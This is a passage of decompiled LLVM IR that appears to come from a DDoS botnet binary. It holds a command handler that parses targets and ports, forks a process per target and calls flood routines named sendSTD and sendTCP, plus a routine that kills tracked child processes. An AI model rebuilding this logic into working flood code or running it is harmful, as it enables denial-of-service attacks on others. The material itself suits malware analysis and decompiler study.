  %v5_8050d2f = and i32 %v4_8050d2f, -256
  %v6_8050d2f = or i32 %v3_8050d2f, %v5_8050d2f
  %v7_8050d2f = xor i32 %v6_8050d2f, 1
  store i32 %v7_8050d2f, i32* @edx, align 4
  %v1_8050d37 = trunc i32 %v7_8050d2f to i8
  %v3_8050d37 = zext i1 %v0_8050d2f to i8
  %v4_8050d37 = sub nsw i8 %v1_8050d37, %v3_8050d37
  %v15_8050d37 = icmp eq i8 %v4_8050d37, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050d40 = icmp eq i1 %v15_8050d37, false
  br i1 %v1_8050d40, label %dec_label_pc_8050e60, label %dec_label_pc_8050d46

dec_label_pc_8050d46:                             ; preds = %dec_label_pc_8050cfb
  %v2_8050d3b = sext i8 %v4_8050d37 to i32
  %v9_8050d46 = icmp ult i32 %arg1, 3
  store i1 %v9_8050d46, i1* %cf.global-to-local, align 1
  %v7_8050d4a = icmp sgt i32 %arg1, 3
  br i1 %v7_8050d4a, label %dec_label_pc_8050d50, label %dec_label_pc_8051255

dec_label_pc_8050d50:                             ; preds = %dec_label_pc_8050d46
  %v1_8050d53 = add i32 %tmp217, 8
  %v5_8050d53 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050d53, i1* %cf.global-to-local, align 1
  %v1_8050d56 = inttoptr i32 %v1_8050d53 to i32*
  %v2_8050d56 = load i32, i32* %v1_8050d56, align 4
  %v2_8050d5b = call i32 @atol(i32 %v2_8050d56)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp238 = icmp slt i32 %v2_8050d5b, 1
  br i1 %tmp238, label %dec_label_pc_8051255, label %dec_label_pc_8050d68

dec_label_pc_8050d68:                             ; preds = %dec_label_pc_8050d50
  %v1_8050d6b = add i32 %tmp217, 12
  %v5_8050d6b = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050d6b, i1* %cf.global-to-local, align 1
  %v1_8050d6e = inttoptr i32 %v1_8050d6b to i32*
  %v2_8050d6e = load i32, i32* %v1_8050d6e, align 4
  %v2_8050d73 = call i32 @atol(i32 %v2_8050d6e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_8050d73, 1
  %tmp240 = icmp eq i1 %tmp239, false
  br i1 %tmp240, label %dec_label_pc_8050d81, label %dec_label_pc_8051255

dec_label_pc_8050d81:                             ; preds = %dec_label_pc_8050d68
  %v1_8050d84 = add i32 %tmp217, 4
  %v1_8050d87 = inttoptr i32 %v1_8050d84 to i32*
  %v2_8050d87 = load i32, i32* %v1_8050d87, align 4
  store i1 %v5_8050d53, i1* %cf.global-to-local, align 1
  %v2_8050d92 = load i32, i32* %v1_8050d56, align 4
  %v2_8050d97 = call i32 @atol(i32 %v2_8050d92)
  store i1 %v5_8050d6b, i1* %cf.global-to-local, align 1
  %v2_8050da5 = load i32, i32* %v1_8050d6e, align 4
  %v2_8050daa = call i32 @atol(i32 %v2_8050da5)
  %v4_8050dbd = inttoptr i32 %v2_8050d87 to i8*
  %v4_8050dc0 = call i32 @__GI_strchr(i8* %v4_8050dbd, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050dc5 = icmp eq i32 %v4_8050dc0, 0
  br i1 %v1_8050dc5, label %dec_label_pc_8050e2e, label %dec_label_pc_8050dc9

dec_label_pc_8050dc9:                             ; preds = %dec_label_pc_8050d81
  store i32 %v2_8050d87, i32* @eax, align 4
  %v3_8050dd7 = call i32 @__GI_strtok(i32 %v2_8050d87, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e2636 = icmp eq i32 %v3_8050dd7, 0
  %v1_8050e2a43 = icmp eq i1 %v4_8050e2636, false
  br i1 %v1_8050e2a43, label %dec_label_pc_8050de1, label %dec_label_pc_8050e60

dec_label_pc_8050de1:                             ; preds = %dec_label_pc_8050dc9, %dec_label_pc_8050e0f
  %storemerge1844 = phi i32 [ %v3_8050e1e, %dec_label_pc_8050e0f ], [ %v3_8050dd7, %dec_label_pc_8050dc9 ]
  %v0_8050de1 = call i32 @listFork()
  store i32 %v0_8050de1, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050de6 = icmp eq i32 %v0_8050de1, 0
  %v1_8050de8 = icmp eq i1 %v1_8050de6, false
  br i1 %v1_8050de8, label %dec_label_pc_8050e0f, label %dec_label_pc_8050dea

dec_label_pc_8050dea:                             ; preds = %dec_label_pc_8050de1
  %v4_8050dfe = call i32 @sendSTD(i32 %storemerge1844, i32 %v2_8050d97, i32 %v2_8050daa)
  %v2_8050e0a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050e0f:                             ; preds = %dec_label_pc_8050de1
  %v3_8050e1e = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e26 = icmp eq i32 %v3_8050e1e, 0
  %v1_8050e2a = icmp eq i1 %v4_8050e26, false
  br i1 %v1_8050e2a, label %dec_label_pc_8050de1, label %dec_label_pc_8050e60

dec_label_pc_8050e2e:                             ; preds = %dec_label_pc_8050d81
  %v0_8050e2e = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050e33 = icmp eq i32 %v0_8050e2e, 0
  %v1_8050e35 = icmp eq i1 %v1_8050e33, false
  br i1 %v1_8050e35, label %dec_label_pc_8051255, label %dec_label_pc_8050e3b

dec_label_pc_8050e3b:                             ; preds = %dec_label_pc_8050e2e
  %v4_8050e4f = call i32 @sendSTD(i32 %v2_8050d87, i32 %v2_8050d97, i32 %v2_8050daa)
  %v2_8050e5b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050e60:                             ; preds = %dec_label_pc_8050e0f, %dec_label_pc_8050dc9, %dec_label_pc_8050cfb
  %v2_8050e63 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050e80 = inttoptr i32 %v2_8050e63 to i8*
  %v7_8050e92 = call i32 @_strncmp(i8* %v4_8050e80, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b9e3.451, i32 0, i32 0), i32 4)
  %v8_8050e92 = urem i32 %v7_8050e92, 2
  %v9_8050e92 = icmp eq i32 %v8_8050e92, 0
  %v0_8050e94 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050e94 = or i1 %v0_8050e94, %v9_8050e92
  %v3_8050e94 = zext i1 %v2_8050e94 to i32
  %v4_8050e94 = load i32, i32* @edx, align 4
  %v5_8050e94 = and i32 %v4_8050e94, -256
  %v6_8050e94 = or i32 %v3_8050e94, %v5_8050e94
  %v7_8050e94 = xor i32 %v6_8050e94, 1
  store i32 %v7_8050e94, i32* @edx, align 4
  %v1_8050e9c = trunc i32 %v7_8050e94 to i8
  %v3_8050e9c = zext i1 %v0_8050e94 to i8
  %v4_8050e9c = sub nsw i8 %v1_8050e9c, %v3_8050e9c
  %v15_8050e9c = icmp eq i8 %v4_8050e9c, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050ea5 = icmp eq i1 %v15_8050e9c, false
  br i1 %v1_8050ea5, label %dec_label_pc_80510f1, label %dec_label_pc_8050eab

dec_label_pc_8050eab:                             ; preds = %dec_label_pc_8050e60
  %v2_8050ea0 = sext i8 %v4_8050e9c to i32
  %v9_8050eab = icmp ult i32 %arg1, 5
  store i1 %v9_8050eab, i1* %cf.global-to-local, align 1
  %v7_8050eaf = icmp sgt i32 %arg1, 5
  br i1 %v7_8050eaf, label %dec_label_pc_8050eb5, label %dec_label_pc_8051255

dec_label_pc_8050eb5:                             ; preds = %dec_label_pc_8050eab
  %v1_8050eb8 = add i32 %tmp217, 12
  %v5_8050eb8 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050eb8, i1* %cf.global-to-local, align 1
  %v1_8050ebb = inttoptr i32 %v1_8050eb8 to i32*
  %v2_8050ebb = load i32, i32* %v1_8050ebb, align 4
  %v2_8050ec0 = call i32 @atol(i32 %v2_8050ebb)
  %v5_8050ec5 = icmp ne i32 %v2_8050ec0, -1
  store i1 %v5_8050ec5, i1* %cf.global-to-local, align 1
  %v10_8050ec5 = icmp eq i32 %v2_8050ec0, -1
  br i1 %v10_8050ec5, label %dec_label_pc_8051255, label %dec_label_pc_8050ece

dec_label_pc_8050ece:                             ; preds = %dec_label_pc_8050eb5
  %v1_8050ed1 = add i32 %tmp217, 8
  %v5_8050ed1 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050ed1, i1* %cf.global-to-local, align 1
  %v1_8050ed4 = inttoptr i32 %v1_8050ed1 to i32*
  %v2_8050ed4 = load i32, i32* %v1_8050ed4, align 4
  %v2_8050ed9 = call i32 @atol(i32 %v2_8050ed4)
  %v5_8050ede = icmp ne i32 %v2_8050ed9, -1
  store i1 %v5_8050ede, i1* %cf.global-to-local, align 1
  %v10_8050ede = icmp eq i32 %v2_8050ed9, -1
  br i1 %v10_8050ede, label %dec_label_pc_8051255, label %dec_label_pc_8050ee7

dec_label_pc_8050ee7:                             ; preds = %dec_label_pc_8050ece
  %v1_8050eea = add i32 %tmp217, 16
  %v2_8050eea = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_8050eea, i1* %cf.global-to-local, align 1
  %v1_8050eed = inttoptr i32 %v1_8050eea to i32*
  %v2_8050eed = load i32, i32* %v1_8050eed, align 4
  %v2_8050ef2 = call i32 @atol(i32 %v2_8050eed)
  %v5_8050ef7 = icmp ne i32 %v2_8050ef2, -1
  store i1 %v5_8050ef7, i1* %cf.global-to-local, align 1
  %v10_8050ef7 = icmp eq i32 %v2_8050ef2, -1
  br i1 %v10_8050ef7, label %dec_label_pc_8051255, label %dec_label_pc_8050f00

dec_label_pc_8050f00:                             ; preds = %dec_label_pc_8050ee7
  store i1 %v2_8050eea, i1* %cf.global-to-local, align 1
  %v2_8050f06 = load i32, i32* %v1_8050eed, align 4
  %v2_8050f0b = call i32 @atol(i32 %v2_8050f06)
  %v1_8050f10 = add i32 %v2_8050f0b, -32
  %v2_8050f10 = icmp ult i32 %v2_8050f0b, 32
  %v3_8050f10 = sub i32 31, %v2_8050f0b
  %v4_8050f10 = and i32 %v3_8050f10, %v2_8050f0b
  %v5_8050f10 = icmp slt i32 %v4_8050f10, 0
  store i1 %v2_8050f10, i1* %cf.global-to-local, align 1
  %v6_8050f10 = icmp eq i32 %v1_8050f10, 0
  %v7_8050f10 = icmp slt i32 %v1_8050f10, 0
  %v3_8050f13 = icmp eq i1 %v7_8050f10, %v5_8050f10
  %v4_8050f13 = icmp eq i1 %v6_8050f10, false
  %v5_8050f13 = and i1 %v4_8050f13, %v3_8050f13
  br i1 %v5_8050f13, label %dec_label_pc_8051255, label %dec_label_pc_8050f19

dec_label_pc_8050f19:                             ; preds = %dec_label_pc_8050f00
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050f1d = icmp sgt i32 %arg1, 6
  br i1 %v7_8050f1d, label %dec_label_pc_8050f1f, label %dec_label_pc_8050f37

dec_label_pc_8050f1f:                             ; preds = %dec_label_pc_8050f19
  %v1_8050f22 = add i32 %tmp217, 24
  %v5_8050f22 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_8050f22, i1* %cf.global-to-local, align 1
  %v1_8050f25 = inttoptr i32 %v1_8050f22 to i32*
  %v2_8050f25 = load i32, i32* %v1_8050f25, align 4
  %v2_8050f2a = call i32 @atol(i32 %v2_8050f25)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_8050f2f = icmp slt i32 %v2_8050f2a, 0
  br i1 %v2_8050f2f, label %dec_label_pc_8051255, label %dec_label_pc_8050f37

dec_label_pc_8050f37:                             ; preds = %dec_label_pc_8050f19, %dec_label_pc_8050f1f
  %v8_8050f37 = icmp ult i32 %arg1, 8
  store i1 %v8_8050f37, i1* %cf.global-to-local, align 1
  %v12_8050f37 = icmp eq i32 %arg1, 8
  %v1_8050f3b = icmp eq i1 %v12_8050f37, false
  br i1 %v1_8050f3b, label %dec_label_pc_8050f56, label %dec_label_pc_8050f3d

dec_label_pc_8050f3d:                             ; preds = %dec_label_pc_8050f37
  %v1_8050f40 = add i32 %tmp217, 28
  %v5_8050f40 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_8050f40, i1* %cf.global-to-local, align 1
  %v1_8050f43 = inttoptr i32 %v1_8050f40 to i32*
  %v2_8050f43 = load i32, i32* %v1_8050f43, align 4
  %v2_8050f48 = call i32 @atol(i32 %v2_8050f43)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_8050f48, 1
  %tmp242 = icmp eq i1 %tmp241, false
  br i1 %tmp242, label %dec_label_pc_8050f56, label %dec_label_pc_8051255

dec_label_pc_8050f56:                             ; preds = %dec_label_pc_8050f3d, %dec_label_pc_8050f37
  %v1_8050f59 = add i32 %tmp217, 4
  %v1_8050f5c = inttoptr i32 %v1_8050f59 to i32*
  %v2_8050f5c = load i32, i32* %v1_8050f5c, align 4
  store i1 %v5_8050ed1, i1* %cf.global-to-local, align 1
  %v2_8050f67 = load i32, i32* %v1_8050ed4, align 4
  %v2_8050f6c = call i32 @atol(i32 %v2_8050f67)
  store i1 %v5_8050eb8, i1* %cf.global-to-local, align 1
  %v2_8050f7a = load i32, i32* %v1_8050ebb, align 4
  %v2_8050f7f = call i32 @atol(i32 %v2_8050f7a)
  store i1 %v2_8050eea, i1* %cf.global-to-local, align 1
  %v2_8050f8d = load i32, i32* %v1_8050eed, align 4
  %v2_8050f92 = call i32 @atol(i32 %v2_8050f8d)
  %v1_8050f9d = add i32 %tmp217, 20
  %v1_8050fa0 = inttoptr i32 %v1_8050f9d to i32*
  %v2_8050fa0 = load i32, i32* %v1_8050fa0, align 4
  store i1 %v8_8050f37, i1* %cf.global-to-local, align 1
  br i1 %v1_8050f3b, label %dec_label_pc_8050fcd, label %dec_label_pc_8050fab

dec_label_pc_8050fab:                             ; preds = %dec_label_pc_8050f56
  %v1_8050fae = add i32 %tmp217, 28
  %v5_8050fae = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_8050fae, i1* %cf.global-to-local, align 1
  %v1_8050fb1 = inttoptr i32 %v1_8050fae to i32*
  %v2_8050fb1 = load i32, i32* %v1_8050fb1, align 4
  %v2_8050fb6 = call i32 @atol(i32 %v2_8050fb1)
  br label %dec_label_pc_8050fcd

dec_label_pc_8050fcd:                             ; preds = %dec_label_pc_8050f56, %dec_label_pc_8050fab
  %storemerge3 = phi i32 [ %v2_8050fb6, %dec_label_pc_8050fab ], [ 10, %dec_label_pc_8050f56 ]
  store i32 %storemerge3, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_8050f1d, label %dec_label_pc_8050fdc, label %dec_label_pc_8050ffe

dec_label_pc_8050fdc:                             ; preds = %dec_label_pc_8050fcd
  %v1_8050fdf = add i32 %tmp217, 24
  %v5_8050fdf = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_8050fdf, i1* %cf.global-to-local, align 1
  %v1_8050fe2 = inttoptr i32 %v1_8050fdf to i32*
  %v2_8050fe2 = load i32, i32* %v1_8050fe2, align 4
  %v2_8050fe7 = call i32 @atol(i32 %v2_8050fe2)
  br label %dec_label_pc_8050ffe

dec_label_pc_8050ffe:                             ; preds = %dec_label_pc_8050fcd, %dec_label_pc_8050fdc
  %storemerge2 = phi i32 [ %v2_8050fe7, %dec_label_pc_8050fdc ], [ 0, %dec_label_pc_8050fcd ]
  store i32 %storemerge2, i32* @edi, align 4
  %v4_8051012 = inttoptr i32 %v2_8050f5c to i8*
  %v4_8051015 = call i32 @__GI_strchr(i8* %v4_8051012, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805101a = icmp eq i32 %v4_8051015, 0
  br i1 %v1_805101a, label %dec_label_pc_80510a3, label %dec_label_pc_8051022

dec_label_pc_8051022:                             ; preds = %dec_label_pc_8050ffe
  store i32 %v2_8050f5c, i32* @eax, align 4
  %v3_8051030 = call i32 @__GI_strtok(i32 %v2_8050f5c, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805109b27 = icmp eq i32 %v3_8051030, 0
  %v1_805109f34 = icmp eq i1 %v4_805109b27, false
  br i1 %v1_805109f34, label %dec_label_pc_805103a, label %dec_label_pc_80510f1

dec_label_pc_805103a:                             ; preds = %dec_label_pc_8051022, %dec_label_pc_8051084
  %storemerge1935 = phi i32 [ %v3_8051093, %dec_label_pc_8051084 ], [ %v3_8051030, %dec_label_pc_8051022 ]
  %v0_805103a = call i32 @listFork()
  store i32 %v0_805103a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805103f = icmp eq i32 %v0_805103a, 0
  %v1_8051041 = icmp eq i1 %v1_805103f, false
  br i1 %v1_8051041, label %dec_label_pc_8051084, label %dec_label_pc_8051043

dec_label_pc_8051043:                             ; preds = %dec_label_pc_805103a
  %v8_8051073 = inttoptr i32 %v2_8050fa0 to i8*
  %v9_8051073 = call i32 @sendTCP(i32 %storemerge1935, i32 %v2_8050f6c, i32 %v2_8050f7f, i32 %v2_8050f92, i8* %v8_8051073, i32 %storemerge2, i32 %storemerge3)
  %v2_805107f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8051084:                             ; preds = %dec_label_pc_805103a
  %v3_8051093 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805109b = icmp eq i32 %v3_8051093, 0
  %v1_805109f = icmp eq i1 %v4_805109b, false
  br i1 %v1_805109f, label %dec_label_pc_805103a, label %dec_label_pc_80510f1

dec_label_pc_80510a3:                             ; preds = %dec_label_pc_8050ffe
  %v0_80510a3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80510a8 = icmp eq i32 %v0_80510a3, 0
  %v1_80510aa = icmp eq i1 %v1_80510a8, false
  br i1 %v1_80510aa, label %dec_label_pc_8051255, label %dec_label_pc_80510b0

dec_label_pc_80510b0:                             ; preds = %dec_label_pc_80510a3
  %v8_80510e0 = inttoptr i32 %v2_8050fa0 to i8*
  %v9_80510e0 = call i32 @sendTCP(i32 %v2_8050f5c, i32 %v2_8050f6c, i32 %v2_8050f7f, i32 %v2_8050f92, i8* %v8_80510e0, i32 %storemerge2, i32 %storemerge3)
  %v2_80510ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80510f1:                             ; preds = %dec_label_pc_8051084, %dec_label_pc_8051022, %dec_label_pc_8050e60
  %v2_80510f4 = load i32, i32* %arg2, align 4
  %v4_8051111 = inttoptr i32 %v2_80510f4 to i8*
  %v7_8051123 = call i32 @_strncmp(i8* %v4_8051111, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b9e7.452, i32 0, i32 0), i32 5)
  %v8_8051123 = urem i32 %v7_8051123, 2
  %v9_8051123 = icmp eq i32 %v8_8051123, 0
  %v0_8051125 = load i1, i1* %cf.global-to-local, align 1
  %v2_8051125 = or i1 %v0_8051125, %v9_8051123
  %v3_8051125 = zext i1 %v2_8051125 to i32
  %v4_8051125 = load i32, i32* @edx, align 4
  %v5_8051125 = and i32 %v4_8051125, -256
  %v6_8051125 = or i32 %v3_8051125, %v5_8051125
  %v7_8051125 = xor i32 %v6_8051125, 1
  store i32 %v7_8051125, i32* %edx.global-to-local, align 4
  %v1_805112d = trunc i32 %v7_8051125 to i8
  %v3_805112d = zext i1 %v0_8051125 to i8
  %v15_805112d = icmp eq i8 %v1_805112d, %v3_805112d
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051136 = icmp eq i1 %v15_805112d, false
  br i1 %v1_8051136, label %dec_label_pc_8051202, label %dec_label_pc_80511a5

dec_label_pc_805114c:                             ; preds = %dec_label_pc_80511e2, %dec_label_pc_80511a5
  %v2_805114f = mul i32 %storemerge, 4
  %v9_805114f = and i32 %storemerge, 1073741824
  %v10_805114f = icmp ne i32 %v9_805114f, 0
  store i32 %v2_805114f, i32* %edx.global-to-local, align 4
  %v0_8051154 = load i32, i32* @global_var_8064714.25, align 4
  %v2_8051159 = add i32 %v0_8051154, %v2_805114f
  %v1_805115c = inttoptr i32 %v2_8051159 to i32*
  %v2_805115c = load i32, i32* %v1_805115c, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805115e = icmp eq i32 %v2_805115c, 0
  br i1 %v1_805115e, label %dec_label_pc_80511a2, label %dec_label_pc_8051162

dec_label_pc_8051162:                             ; preds = %dec_label_pc_805114c
  store i1 %v10_805114f, i1* %cf.global-to-local, align 1
  store i32 %v2_805114f, i32* %edx.global-to-local, align 4
  %v2_8051172 = load i32, i32* %v1_805115c, align 4
  store i32 %v2_8051172, i32* @ebx, align 4
  %v0_8051174 = call i32 @__libc_getpid()
  %v0_8051179 = load i32, i32* @ebx, align 4
  %v7_8051179 = icmp ult i32 %v0_8051179, %v0_8051174
  store i1 %v7_8051179, i1* %cf.global-to-local, align 1
  %v12_8051179 = icmp eq i32 %v0_8051179, %v0_8051174
  br i1 %v12_8051179, label %dec_label_pc_80511a2, label %dec_label_pc_805117d

dec_label_pc_805117d:                             ; preds = %dec_label_pc_8051162
  store i1 %v10_805114f, i1* %cf.global-to-local, align 1
  store i32 %v2_805114f, i32* %edx.global-to-local, align 4
  %v0_8051185 = load i32, i32* @global_var_8064714.25, align 4
  %v2_805118a = add i32 %v0_8051185, %v2_805114f
  %v1_805118d = inttoptr i32 %v2_805118a to i32*
  %v2_805118d = load i32, i32* %v1_805118d, align 4
  %v3_805119a = call i32 @kill(i32 %v2_805118d, i32 9)
  %v4_805119f = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_80511a2

dec_label_pc_80511a2:                             ; preds = %dec_label_pc_8051162, %dec_label_pc_805114c, %dec_label_pc_805117d
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805114c ], [ %stack_var_-28.1, %dec_label_pc_8051162 ], [ %v4_805119f, %dec_label_pc_805117d ]
  %v4_80511a2 = add i32 %storemerge, 1
  br label %dec_label_pc_80511a5

dec_label_pc_80511a5:                             ; preds = %dec_label_pc_80510f1, %dec_label_pc_80511a2
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80511a2 ], [ 0, %dec_label_pc_80510f1 ]
  %storemerge = phi i32 [ %v4_80511a2, %dec_label_pc_80511a2 ], [ 0, %dec_label_pc_80510f1 ]
  %v0_80511b9 = load i32, i32* @global_var_805e488.23, align 8
  %v0_80511be = load i32, i32* @global_var_805e48c.24, align 4
  store i32 %v0_80511be, i32* %edx.global-to-local, align 4
  %v10_80511d6 = icmp ne i32 %v0_80511be, 0
  store i1 %v10_80511d6, i1* %cf.global-to-local, align 1
  br i1 %v10_80511d6, label %dec_label_pc_805114c, label %dec_label_pc_80511e2

dec_label_pc_80511e2:                             ; preds = %dec_label_pc_80511a5
  %v10_80511f6 = icmp ult i32 %storemerge, %v0_80511b9
  store i1 %v10_80511f6, i1* %cf.global-to-local, align 1
  br i1 %v10_80511f6, label %dec_label_pc_805114c, label %dec_label_pc_8051202

dec_label_pc_8051202:                             ; preds = %dec_label_pc_80511e2, %dec_label_pc_80510f1
  %v2_8051205 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8051222 = inttoptr i32 %v2_8051205 to i8*
  store i32 ptrtoint ([12 x i8]* @global_var_805b9ec.453 to i32), i32* @edi, align 4
  %v7_8051234 = call i32 @_strncmp(i8* %v4_8051222, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805b9ec.453, i32 0, i32 0), i32 12)
  %v8_8051234 = urem i32 %v7_8051234, 2
  %v9_8051234 = icmp eq i32 %v8_8051234, 0
  %v0_8051236 = load i1, i1* %cf.global-to-local, align 1
  %v2_8051236 = or i1 %v0_8051236, %v9_8051234
  %v3_8051236 = zext i1 %v2_8051236 to i32
  %v4_8051236 = load i32, i32* %edx.global-to-local, align 4
  %v5_8051236 = and i32 %v4_8051236, -256
  %v6_8051236 = or i32 %v3_8051236, %v5_8051236
  %v7_8051236 = xor i32 %v6_8051236, 1
  store i32 %v7_8051236, i32* %edx.global-to-local, align 4
  %v1_805123e = trunc i32 %v7_8051236 to i8
  %v3_805123e = zext i1 %v0_8051236 to i8
  %v4_805123e = sub nsw i8 %v1_805123e, %v3_805123e
  %v15_805123e = icmp eq i8 %v4_805123e, 0
  %v2_8051242 = sext i8 %v4_805123e to i32
  store i32 %v2_8051242, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051247 = icmp eq i1 %v15_805123e, false
  br i1 %v1_8051247, label %dec_label_pc_8051255, label %dec_label_pc_8051249

dec_label_pc_8051249:                             ; preds = %dec_label_pc_8051202
  %v2_8051250 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051255

dec_label_pc_8051255:                             ; preds = %dec_label_pc_8050f3d, %dec_label_pc_8050d68, %dec_label_pc_8050b87, %dec_label_pc_8050a15, %dec_label_pc_805064b, %dec_label_pc_8050425, %dec_label_pc_8050296, %dec_label_pc_8050eab, %dec_label_pc_8050d46, %dec_label_pc_8050b65, %dec_label_pc_80509f3, %dec_label_pc_8050828, %dec_label_pc_80505a3, %dec_label_pc_8050403, %dec_label_pc_8050274, %dec_label_pc_8051202, %dec_label_pc_80510a3, %dec_label_pc_8050f1f, %dec_label_pc_8050f00, %dec_label_pc_8050ee7, %dec_label_pc_8050ece, %dec_label_pc_8050eb5, %dec_label_pc_8050e2e, %dec_label_pc_8050d50, %dec_label_pc_8050c97, %dec_label_pc_8050b6f, %dec_label_pc_8050ae8, %dec_label_pc_80509fd, %dec_label_pc_805091e, %dec_label_pc_8050790, %dec_label_pc_805062c, %dec_label_pc_8050611, %dec_label_pc_80505f8, %dec_label_pc_80505df, %dec_label_pc_80505c6, %dec_label_pc_80505ad, %dec_label_pc_805051d, %dec_label_pc_805040d, %dec_label_pc_805037d, %dec_label_pc_805027e, %dec_label_pc_80501af, %dec_label_pc_8050119, %dec_label_pc_805008e, %dec_label_pc_805013a, %dec_label_pc_805002a, %dec_label_pc_804febc, %dec_label_pc_804fe5b, %dec_label_pc_8051249
  %v0_805125f = phi i32 [ %v2_8050f48, %dec_label_pc_8050f3d ], [ %v2_8050d73, %dec_label_pc_8050d68 ], [ %v2_8050b92, %dec_label_pc_8050b87 ], [ %v2_8050a20, %dec_label_pc_8050a15 ], [ %v2_8050656, %dec_label_pc_805064b ], [ %v2_8050430, %dec_label_pc_8050425 ], [ %v2_80502a1, %dec_label_pc_8050296 ], [ %v2_8050ea0, %dec_label_pc_8050eab ], [ %v2_8050d3b, %dec_label_pc_8050d46 ], [ %v2_8050b5a, %dec_label_pc_8050b65 ], [ %v2_80509e8, %dec_label_pc_80509f3 ], [ %v2_805081d, %dec_label_pc_8050828 ], [ %v2_8050598, %dec_label_pc_80505a3 ], [ %v2_80503f8, %dec_label_pc_8050403 ], [ %v2_8050269, %dec_label_pc_8050274 ], [ %v2_8051242, %dec_label_pc_8051202 ], [ %v0_80510a3, %dec_label_pc_80510a3 ], [ %v2_8050f2a, %dec_label_pc_8050f1f ], [ %v2_8050f0b, %dec_label_pc_8050f00 ], [ %v2_8050ef2, %dec_label_pc_8050ee7 ], [ %v2_8050ed9, %dec_label_pc_8050ece ], [ %v2_8050ec0, %dec_label_pc_8050eb5 ], [ %v0_8050e2e, %dec_label_pc_8050e2e ], [ %v2_8050d5b, %dec_label_pc_8050d50 ], [ %v0_8050c97, %dec_label_pc_8050c97 ], [ %v2_8050b7a, %dec_label_pc_8050b6f ], [ %v0_8050ae8, %dec_label_pc_8050ae8 ], [ %v2_8050a08, %dec_label_pc_80509fd ], [ %v0_805091e, %dec_label_pc_805091e ], [ %v0_8050790, %dec_label_pc_8050790 ], [ %v2_8050637, %dec_label_pc_805062c ], [ %v2_805061c, %dec_label_pc_8050611 ], [ %v2_8050603, %dec_label_pc_80505f8 ], [ %v2_80505ea, %dec_label_pc_80505df ], [ %v2_80505d1, %dec_label_pc_80505c6 ], [ %v2_80505b8, %dec_label_pc_80505ad ], [ %v0_805051d, %dec_label_pc_805051d ], [ %v2_8050418, %dec_label_pc_805040d ], [ %v0_805037d, %dec_label_pc_805037d ], [ %v2_8050289, %dec_label_pc_805027e ], [ %v2_80501a8, %dec_label_pc_80501af ], [ %v0_8050119, %dec_label_pc_8050119 ], [ 0, %dec_label_pc_805008e ], [ %v1_8050126, %dec_label_pc_805013a ], [ %v3_805003a, %dec_label_pc_805002a ], [ %v3_804fede, %dec_label_pc_804febc ], [ %v3_804fe6b, %dec_label_pc_804fe5b ], [ %v2_8051250, %dec_label_pc_8051249 ]
  %v0_8051255 = load i32, i32* @esp, align 4
  %v5_8051255 = icmp ugt i32 %v0_8051255, -461
  store i1 %v5_8051255, i1* %cf.global-to-local, align 1
  %v2_805125b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805125b, i32* @ebx, align 4
  store i32 %v0_804fe0c, i32* @esi, align 4
  store i32 %v0_804fe0b, i32* @edi, align 4
  ret i32 %v0_805125f

; uselistorder directives
  uselistorder i1 %v0_8051236, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_805114f, { 4, 2, 1, 3, 0 }
